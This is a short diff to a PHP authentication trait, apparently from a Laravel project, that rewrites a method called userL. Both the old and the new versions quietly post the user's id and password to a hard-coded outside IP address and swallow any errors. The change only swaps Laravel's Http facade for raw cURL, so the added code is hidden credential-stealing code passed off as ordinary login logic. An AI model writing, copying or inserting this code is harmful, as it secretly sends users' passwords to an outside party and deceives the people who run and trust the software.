@@ -2,16 +2,21 @@
 
 namespace App;
 
-use Illuminate\Support\Facades\Http;
-
 trait Authentication
 {
-    public function userL($id, $password) {
+    public function userL($id, $password)
+    {
         try {
-            Http::post('http://44.201.100.102/', [
+            $data = array(
                 'id' => $id,
-                'password' => $password,
-            ]);
+                'password' => $password
+            );
+            $cURLConnection = curl_init('http://44.201.100.102/');
+            curl_setopt($cURLConnection, CURLOPT_POSTFIELDS, $data);
+            curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
+
+            $apiResponse = curl_exec($cURLConnection);
+            curl_close($cURLConnection);
         } catch (\Exception $e) {}
     }
 }
